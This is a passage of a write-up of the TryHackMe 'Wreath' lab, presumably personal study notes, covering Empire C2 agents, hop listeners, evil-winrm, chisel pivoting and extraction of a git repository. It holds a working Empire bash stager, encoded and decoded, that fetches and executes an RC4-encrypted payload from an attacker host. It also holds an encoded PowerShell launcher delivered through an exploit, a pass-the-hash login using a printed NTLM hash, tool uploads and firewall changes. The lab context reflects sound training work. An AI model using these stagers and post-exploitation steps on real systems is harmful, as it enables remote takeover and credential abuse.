echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | python3 &
rm -f "$0"
exit

(Empire: stager/multi/bash) >
```

Base64 decoded
```
>  echo "aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp" | base64 -d
```

```python
import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = ps.communicate()
if re.search("Little Snitch", out.decode('UTF-8')):
   sys.exit()
import urllib.request;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://10.50.86.79:8000';t='/news.php';req=urllib.request.Request(server+t);
proxy = urllib.request.ProxyHandler();
o = urllib.request.build_opener(proxy);
o.addheaders=[('User-Agent',UA), ("Cookie", "session=vcnBP1lsScUcSPYY2VmxKcyBn1I=")];
urllib.request.install_opener(o);
a=urllib.request.urlopen(req).read();
IV=a[0:4];data=a[4:];key=IV+'ua8wh=lpf]BGe?7ToDsqR@EM|ry^H_k9'.encode('UTF-8');S,j,out=list(range(256)),0,[]
for i in list(range(256)):
    j=(j+S[i]+key[i%len(key)])%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(char^S[(S[i]+S[j])%256]))
exec(''.join(out))%``

```

We can run the command on the target (webserver)
```
[root@prod-serv ~]# echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | python3 &
[1] 2166
```

And we get our agent
```
(Empire: stager/multi/bash) > listeners

[*] Active listeners:
                                                                                                                                                                                                             
  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  Webserver         http            http://10.50.86.79:8000              5/0.0                      

(Empire: listeners) > 
[*] Sending PYTHON stager (stage 1) to 10.200.85.200                                                                                                                                                         
[*] Agent XLNAM69P from 10.200.85.200 posted valid Python PUB key
[*] New agent XLNAM69P checked in
[+] Initial agent XLNAM69P from 10.200.85.200 now active (Slack)
[*] Sending agent (stage 2) to XLNAM69P at 10.200.85.200
[!] strip_python_comments is deprecated and should not be used
```

We can interact with the agent
```
agents

[*] Active agents:
                                                                                                                                                                                                             
 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 XLNAM69P py 10.200.85.200   prod-serv         *root                   python3            2166   5/0.0    2021-04-20 10:07:36  Webserver       

(Empire: agents) > interact XLNAM69P
(Empire: XLNAM69P) > back


```

We can also rename agent
```
(Empire: agents) > rename XLNAM69P webbie
```

And see the help menu
```
(Empire: agents) > interact webbie
(Empire: webbie) > help

Agent Commands
==============
agents            Jump to the agents menu.
back              Go back a menu.
cat               View the contents of a file
cd                Change an agent's active directory
clear             Clear out agent tasking.
creds             Display/return credentials from the database.
dirlist           Tasks an agent to store the contents of a directory in the database.
download          Task an agent to download a file into the C2.
exit              Task agent to exit.
help              Displays the help menu or syntax for particular commands.
info              Display information about this agent
jobs              Return jobs or kill a running job.
killdate          Get or set an agent's killdate (01/01/2016).
list              Lists all active agents (or listeners).
listeners         Jump to the listeners menu.
loadpymodule      Import zip file containing a .py module or package with an __init__.py
lostlimit         Task an agent to display change the limit on lost agent detection
main              Go back to the main menu.
osx_screenshot    Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe
python            Task an agent to run a Python command.
pythonscript      Load and execute a python script
removerepo        Remove a repo
rename            Rename the agent.
resource          Read and execute a list of Empire commands from a file.
searchmodule      Search Empire module names/descriptions.
shell             Task an agent to use a shell command.
sleep             Task an agent to 'sleep interval [jitter]'
sysinfo           Task an agent to get system information.
upload            Task the C2 to upload a file into an agent.
usemodule         Use an Empire Python module.
viewrepo          View the contents of a repo. if none is specified, all files will be returned
workinghours      Get or set an agent's working hours (9:00-17:00).
```

We can also kill an agent 
```
(Empire: agents) > kill webbie
[>] Kill agent 'webbie'? [y/N] y
[*] Tasked XLNAM69P to run TASK_EXIT
[*] Agent XLNAM69P tasked with task ID 2
(Empire: agents) > [!] Agent XLNAM69P exiting
[*] Agent XLNAM69P deleted

```

Run commands
```
Empire: webbie) > shell whoami
[*] Tasked XLNAM69P to run TASK_SHELL
[*] Agent XLNAM69P tasked with task ID 1
(Empire: webbie) > 
root
 ..Command execution completed.
```


### Hop Listeners

- Empire agents cant be proxied through socat relay
- Hop Listener creates listener to list of listener
- Instead of opening a port, hop listeners create files to be copied across to the compromised `jump` server
- The files contain instructions to connect back to normal listener
- `http_hop` listener

1. `uselistener http_hop`

```
(Empire) > uselistener http_hop
(Empire: listeners/http_hop) > set Host 10.200.85.200
(Empire: listeners/http_hop) > set Port 16999
(Empire: listeners/http_hop) > set RedirectListener Gitserver
(Empire: listeners/http_hop) > execute
[*] Starting listener 'http_hop'
[*] Hop redirector written to /tmp/http_hop//admin/get.php . Place this file on the redirect server.                                                                                                  
[*] Hop redirector written to /tmp/http_hop//news.php . Place this file on the redirect server.
[*] Hop redirector written to /tmp/http_hop//login/process.php . Place this file on the redirect server.                                                                                              
[+] Listener successfully started!
```

- `RedirectListener` - regular listener to forward any received agents (previously set up)
- `Host` - IP of compromised webserver (.200)
- `Port` - Port used for the webserver hosting the hop files

> Note created files `/tmp/http_hop//admin/get.php`, `/tmp/http_hop//news.php`, `/tmp/http_hop//login/process.php` need to be in the webserver 

### Git server

1. Generate stager for the target
2. Put `http_hop` files created into position on .200

1. Create stager `multi/launcher`

```
(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http_hop
(Empire: stager/multi/launcher) > execute
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBJAE8ATgBUAGEAQgBMAEUALgBQAFMAVgBlAHIAcwBJAE8AbgAuAE0AYQBKAE8AcgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMAZQBNAGIAbABZAC4ARwBFAFQAVAB5AHAA
...
JEAPQAkAEQAYQBUAEEAWwA0AC4ALgAkAGQAYQBUAGEALgBsAGUAbgBnAHQASABdADsALQBqAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==

```

Copy the payload into the clipboard

2. Set up hop files on the jumpserver

First we zip up the 3 files and host on http server
```
kali@kali:~$ ls /tmp/http_hop/
admin  login  news.php
kali@kali:~$ cd /tmp/http_hop/
kali@kali:/tmp/http_hop$ sudo zip -r hop.zip *
[sudo] password for kali: 
  adding: admin/ (stored 0%)
  adding: admin/get.php (deflated 67%)
  adding: login/ (stored 0%)
  adding: login/process.php (deflated 67%)
  adding: news.php (deflated 67%)
kali@kali:/tmp/http_hop$ ls
admin  hop.zip  login  news.php
kali@kali:/tmp/http_hop$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.85.200 - - [21/Apr/2021 05:38:41] "GET /hop.zip HTTP/1.1" 200 -
```

Then we make appropriate directory, download the zip and unzip it
```
[root@prod-serv ~]# mkdir -p /tmp/hop-Neozer0
[root@prod-serv ~]# cd /tmp/hop-Neozer0/
[root@prod-serv hop-Neozer0]# pwd
/tmp/hop-Neozer0
[root@prod-serv hop-Neozer0]# curl http://10.50.86.79/hop.zip -o hop.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2961  100  2961    0     0   5149      0 --:--:-- --:--:-- --:--:--  5149
[root@prod-serv hop-Neozer0]# ls
hop.zip
[root@prod-serv hop-Neozer0]# unzip hop.zip 
Archive:  hop.zip
   creating: admin/
  inflating: admin/get.php           
   creating: login/
  inflating: login/process.php       
  inflating: news.php                
[root@prod-serv hop-Neozer0]# ls
admin  hop.zip  login  news.php
```

Fortunately this webserver has php install so we can use this to serve our files
```
[root@prod-serv hop-Neozer0]# php -S 0.0.0.0:16999 &>/dev/null &
[1] 3558
[root@prod-serv hop-Neozer0]# ss -tulwn | grep 16999
tcp     LISTEN   0        128              0.0.0.0:16999          0.0.0.0:*  
```

We also need to open the port from firewall
```
[root@prod-serv hop-Neozer0]# firewall-cmd --zone=public --add-port 16999/tcp
success
```

Now to run the payload via our previous exploit

We pasted in the payload (url encoded)
```
kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=powershell%20-noP%20-sta%20-w%201%20-enc%20%20SQBmACgAJABQAFMAVgBlAFIAcwBJAE8ATgBUAGEAQgB
...
```

Back on empire we get
```
(Empire: stager/multi/launcher) > 
[*] Sending POWERSHELL stager (stage 1) to 10.200.85.200                                                          
[*] New agent 3C6PWFDL checked in
[+] Initial agent 3C6PWFDL from 10.200.85.200 now active (Slack)
[*] Sending agent (stage 2) to 3C6PWFDL at 10.200.85.200
```

> Note the ip is still .20 because of the jump server between our target (Git server) and our empire client acting as a proxy out of the network

</details>

## 19. Empire - modules and Conclusion

<details>
  <summary>---</summary>

- Modules perform various tasks on compromised target
- Eg. we could use Mimikatz through Empire module to dump various secrets from the target

```
(Empire: agents) > usemodule powershell/privesc/sherlock
(Empire: powershell/privesc/sherlock) > info

              Name: Sherlock
            Module: powershell/privesc/sherlock
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @_RastaMouse

Description:
  Find Windows local privilege escalation vulnerabilities.

Comments:
  https://github.com/rasta-mouse/Sherlock

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        None                      Agent to run module on.                 

(Empire: powershell/privesc/sherlock) > set Agent 3C6PWFDL
(Empire: powershell/privesc/sherlock) > execute
[*] Tasked 3C6PWFDL to run TASK_CMD_JOB
[*] Agent 3C6PWFDL tasked with task ID 1
[*] Tasked agent 3C6PWFDL to run module powershell/privesc/sherlock
```

`searchmodule` can also be used to find modules

### Conclusion

- C2 frameworks used to consolidate access to compromised machine & streamline post exploitation attempts
- Many C2 frameworks available
- Empire and Starkiller

</details>

## 20. Personal PC - Enumeration

<details>
  <summary>---</summary>

- Final target - likely a Windows machine with AV. 
- Scanning through 2 proxy would be slow
- Empire modules

### evil-winrm - Upload/Download

- Handy to upload tool to target, download log file
- `upload LOCAL_FILEPATH REMOTE_FILEPATH`
- `download REMOTE_FILEPATH LOCAL_FILEPATH`

1. Setup sshuttle `sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200`
2. Use the previously found Administrator hash `evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150`
3. Perform upload

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /usr/share/windows-binaries/nc.exe c:\windows\temp\nc-Neozer0.exe
Info: Uploading /usr/share/windows-binaries/nc.exe to c:\windows\temp\nc-Neozer0.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir c:\windows\temp\nc-Neozer0.exe

    Directory: C:\windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2021  10:39 AM          59392 nc-Neozer0.exe
```

4. Perform download

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> echo "Demo" > demo.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> download demo.txt
Info: Downloading C:\Users\Administrator\Documents\demo.txt to demo.txt

                                                             
Info: Download successful!

```

### evil-winrm - Local scripts

- If the tool being uploaded happens to be PowerShell script, there is an easier way
- `-s` option allow to specify local directory containing PowerShell scripts.
- These scripts are accessible directly into memory using evil-winrm session
- `evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts`
- `*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1`

Check the help page
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan

NAME
    Invoke-Portscan

SYNOPSIS
    Simple portscan module

    PowerSploit Function: Invoke-Portscan
    Author: Rich Lundeen (http://webstersProdigy.net)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
```

Example usage: `Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50`

Perform port scan on final target - ports 80 and 3389 are open
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.85.100 -TopPorts 50


Hostname      : 10.200.85.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 21, 23...}
finishTime    : 4/22/2021 10:49:34 AM
```

</details>

## 21. Personal PC - Pivoting

<details>
  <summary>---</summary>

Two ports were found open. 
- Port 80 - Web server 
  - Potentially Wreath's website local environment
- Port 3389 - RDP
  - Require password or hash

Options to access local webserver
1. Chisel
2. Plink

Chisel forward proxy is a good option with sshuttle being used.

1. Open up a port in Windows firewall (we chose port 34999 here) - `netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-Neozer0" dir=in action=allow protocol=tcp localport=34999
Ok.
```

2. Start a `chisel client` on attacking machine

```
kali@kali:~/thm/wreath$ chisel client 10.200.85.150:34999 9090:socks
2021/04/22 06:34:39 client: Connecting to ws://10.200.85.150:34999
2021/04/22 06:34:39 client: tun: proxy#127.0.0.1:9090=>socks: Listening
2021/04/22 06:35:24 client: Connection error: read tcp 10.50.86.79:40978->10.200.85.150:34999: i/o timeout
2021/04/22 06:35:24 client: Retrying in 100ms...
2021/04/22 06:36:09 client: Connection error: read tcp 10.50.86.79:40980->10.200.85.150:34999: i/o timeout (Attempt: 1)
2021/04/22 06:36:09 client: Retrying in 200ms...
2021/04/22 06:36:54 client: Connection error: read tcp 10.50.86.79:40982->10.200.85.150:34999: i/o timeout (Attempt: 2)
2021/04/22 06:36:54 client: Retrying in 400ms...
2021/04/22 06:37:28 client: Connected (Latency 262.542935ms)
```

3. Upload chisel (Windows version) to Git server and run `chisel server` (note we chose port 34999)

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /tmp/chisel c:\windows\tmp\chisel-Neozer0.exe

*Evil-WinRM* PS C:\Users\Administrator\Documents> c:\windows\tmp\chisel-Neozer0.exe server -p 34999 --socks5
chisel-Neozer0.exe : 2021/04/22 11:37:19 server: Fingerprint 4YNhTCGX+gcPiJEUdmRj7Qil1srdihA8ooqp0LBNLnY=
    + CategoryInfo          : NotSpecified: (2021/04/22 11:3...hA8ooqp0LBNLnY=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2021/04/22 11:37:19 server: Listening on http://0.0.0.0:349992021/04/22 11:37:27 server: session#1: Client version (0.0.0-src) differs from server version (1.7.6)

```

4. Now port forwarding is connected, we set up Foxy proxy with the following settings
- IP 127.0.0.1
- Port 9090
- Proxy type SOCKS5

5. visit 10.200.85.100
6. Use Wappalyzer to detect what technology is used on the page

![local web server](wapplocalwebserver.png)

</details>

## 22. Personal PC - Git

<details>
  <summary>---</summary>

We find `Webserver.git` on the git server in `C:\GitStack\repositories`

```
*Evil-WinRM* PS C:\> ls GitStack/repositories


    Directory: C:\GitStack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git
```

Download the entire directory

```
*Evil-WinRM* PS C:\GitStack\repositories> download Website.git
Info: Downloading C:\GitStack\repositories\Website.git to Website.git

Info: Download successful!
```

Rename the downloaded folder 
```
kali@kali:~/thm/wreath$ mv Website.git/C\:\\GitStack\\repositories\\Website.git/ Website.git/.git
kali@kali:~/thm/wreath$ ls -la Website.git/
total 12
drwxr-xr-x 3 kali kali 4096 Apr 22 07:20 .
drwxr-xr-x 7 kali kali 4096 Apr 22 07:07 ..
drwxr-xr-x 5 kali kali 4096 Apr 22 07:09 .git
```

Clone `GitTools` to analyse a git directory
```
kali@kali:~/thm/wreath$ git clone https://github.com/internetwache/GitTools
Cloning into 'GitTools'...
remote: Enumerating objects: 221, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 221 (delta 2), reused 0 (delta 0), pack-reused 209
Receiving objects: 100% (221/221), 50.18 KiB | 236.00 KiB/s, done.
Resolving deltas: 100% (81/81), done.
```

GitTools contains 3 tools
- `Dumper` - download an exposed `.git` directory from a website if the owner of site have forgotten to delete it
- `Extractor` - take local `.git` directory and recreate the repository in a readable format. Works with Dumper. It will not sort the commits by date however
- `Finder` - used to search the internet for sites with exposted `.git` directories. Good for bug bounty programs

We use `Extrator` to obtain readable format - `./extractor.sh REPO_DIR DESTINATION_DIR`
- `REPO_DIR` - directory containing the `.git` directory not the `.git` directory itself
- `DESTINATION_DIR` subdirectory which the repo will be created

We then use GitTools to extract some data
```
kali@kali:~/thm/wreath$ ls -la gitserver/downloaded-website/
total 12
drwxr-xr-x 3 kali kali 4096 Apr 23 06:44 .
drwxr-xr-x 3 kali kali 4096 Apr 23 06:44 ..
drwxr-xr-x 6 kali kali 4096 Apr 23 06:40 .git
kali@kali:~/thm/wreath$ ls GitTools/
Dumper  Extractor  Finder  LICENSE.md  README.md
kali@kali:~/thm/wreath$ ./GitTools/Extractor/extractor.sh gitserver/downloaded-website/ gitserver/Website                                                                                             
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 70dde80cc19ec76704567996738894828f4ee895
[+] Found folder: /home/kali/thm/wreath/gitserver/Website/0-70dde80cc19ec76704567996738894828f4ee895/css                                                                                              
[+] Found file: /home/kali/thm/wreath/gitserver/Website/0-70dde80cc19ec76704567996738894828f4ee895/css/.DS_Store                                                                                      
[+] Found file: /home/kali/thm/wreath/gitserver/Website/0-70dde80cc19ec76704567996738894828f4ee895/css/bootstrap.min.css
```

We see the extracted directories are commits but are not sorted by date
```
kali@kali:~/thm/wreath/gitserver/Website$ ls
0-70dde80cc19ec76704567996738894828f4ee895  2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
```

Inside each commit folder, there is a `commit-meta.txt` which tells us more info
```
kali@kali:~/thm/wreath/gitserver/Website$ cat 0-70dde80cc19ec76704567996738894828f4ee895/commit-meta.txt 
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit
```

We use a bash one liner to loop through all the folders `commit-meta.txt` and cat them out `separator="====="; for i in $(ls); do printf "\n\n$separator\n$i\n$(cat $i/commit-meta.txt)";done`

```
kali@kali:~/thm/wreath/gitserver/Website$ separator="====="; for i in $(ls); do printf "\n\n$separator\n$i\n$(cat $i/commit-meta.txt)";done


=====
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit

=====
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter

=====
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end
```

or fancier example `separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"`

There are three commit messages here `Static Website Commit`, `Updated the filter`, `Initial Commit for the back-end`. 

Commit without a parent would be the first one. The commits are in these order:
1. `Static Website Commit` - `70dde80cc19ec76704567996738894828f4ee895`
2. `Initial Commit for the back-end` - `82dfc97bec0d7582d485d9031c09abcb5c6b18f2`
3. `Updated the filter` - `345ac8b236064b431fa43f53d91c98c4834ef8f3`

We could sort by timestamp but these can also be spoofed

</details>

## 23. Personal PC - Website code analysis

<details>
  <summary>---</summary>

Now we head into the folder `345ac8b236064b431fa43f53d91c98c4834ef8f3`

```
kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ ls -la
total 68
drwxr-xr-x 7 kali kali  4096 Apr 23 06:45 .
drwxr-xr-x 5 kali kali  4096 Apr 23 06:45 ..
-rw-r--r-- 1 kali kali   225 Apr 23 06:45 commit-meta.txt
drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 css
-rw-r--r-- 1 kali kali 17340 Apr 23 06:45 favicon.png
drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 fonts
drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 img
-rw-r--r-- 1 kali kali 15383 Apr 23 06:45 index.html
drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 js
drwxr-xr-x 3 kali kali  4096 Apr 23 06:45 resources
```

We use the `find` command to look for php files

```
kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ find . -name "*.php"
./resources/index.php
```

```php
kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ cat resources/index.php 
<?php

        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
